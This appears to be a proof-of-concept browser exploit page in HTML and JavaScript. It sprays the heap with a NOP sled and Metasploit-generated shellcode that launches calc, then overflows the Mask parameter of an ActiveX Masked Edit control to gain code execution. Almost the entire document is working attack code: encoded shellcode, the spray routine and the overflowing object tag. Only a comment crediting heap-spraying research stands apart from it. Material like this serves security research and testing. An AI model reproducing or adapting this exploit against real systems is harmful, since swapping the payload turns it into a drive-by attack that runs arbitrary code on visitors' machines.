<input language=JavaScript onclick=doIt() type=button value="Test Exploit">
<script language="JavaScript">

function doIt()
{
var body='<OBJECT CLASSID="CLSID:C932BA85-4374-101B-A56C-00AA003668DC" width="10"><PARAM NAME="Mask" VALUE="';
var body1='"></OBJECT>';
var buf1 = '';
for (i=1;i<=1945;i++){buf1=buf1+unescape("%0c");}

// win32_exec -  EXITFUNC=process CMD=calc Size=330 Encoder=Alpha2 http://metasploit.com

var shellcode = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4937%u4949%u4949%u4949%u4949" +
			 "%u4949%u4949%u4949%u4949%u5a51%u456a%u5058%u4230%u4130%u416b" +
			 "%u5541%u4132%u3242%u4242%u4142%u4230%u5841%u3850%u4241%u7875" +
			 "%u7969%u6d6c%u3038%u6544%u7550%u7350%u6e30%u516b%u7755%u4c4c" +
			 "%u414b%u656c%u3355%u4348%u3831%u4c6f%u304b%u464f%u4c78%u314b" +
			 "%u374f%u3450%u4a41%u624b%u4e69%u666b%u6e54%u666b%u6a61%u304e" +
			 "%u3931%u4f50%u4c69%u6f6c%u5974%u3450%u3534%u5957%u7951%u565a" +
			 "%u776d%u6f71%u7832%u6b6b%u6744%u714b%u6744%u7754%u3474%u4b35" +
			 "%u6e55%u436b%u466f%u6544%u3851%u506b%u4c66%u564b%u306c%u4c4b" +
			 "%u414b%u374f%u656c%u5a51%u6c4b%u654b%u4c4c%u674b%u6871%u6e6b" +
			 "%u7169%u654c%u6674%u5964%u4653%u4951%u6550%u6c34%u634b%u3470" +
			 "%u4b70%u4b35%u5470%u3438%u6e4c%u436b%u6670%u4e6c%u626b%u7550" +
			 "%u4c4c%u6e6d%u536b%u3758%u4a78%u554b%u4c59%u6d4b%u6e50%u6550" +
			 "%u6550%u4750%u6c70%u434b%u6558%u716c%u464f%u5a51%u4156%u3070" +
			 "%u4d56%u6c59%u4e38%u4963%u7150%u526b%u7570%u7138%u4b6e%u4b68" +
			 "%u3152%u6563%u4c38%u5958%u6e6e%u746a%u714e%u4b47%u7a4f%u7047" +
			 "%u6363%u5251%u634c%u5553%u4550");


// A read through "Heap Feng Shui in JavaScript" shed some
// much needed light on this topic for me. Thank you Alexander Sotirov.
var shellcodeSize = (shellcode.length * 2);
var spraySled = unescape("%u9090%u9090");
var heapAddress = 0x0c0c0c0c;
var heapBlockSize = 0x100000;
var spraySledSize = heapBlockSize - (shellcodeSize + 1);
var heapBlocks = (heapAddress+heapBlockSize)/heapBlockSize;
var x = new Array();
while (spraySled.length*2<spraySledSize)
{
spraySled += spraySled;
}
spraySled = spraySled.substring(0,spraySledSize/2);
for (i=0;i<heapBlocks;i++)
{
x[i] = spraySled +  shellcode;
}
document.write(body+buf1+body1);
}

</script>
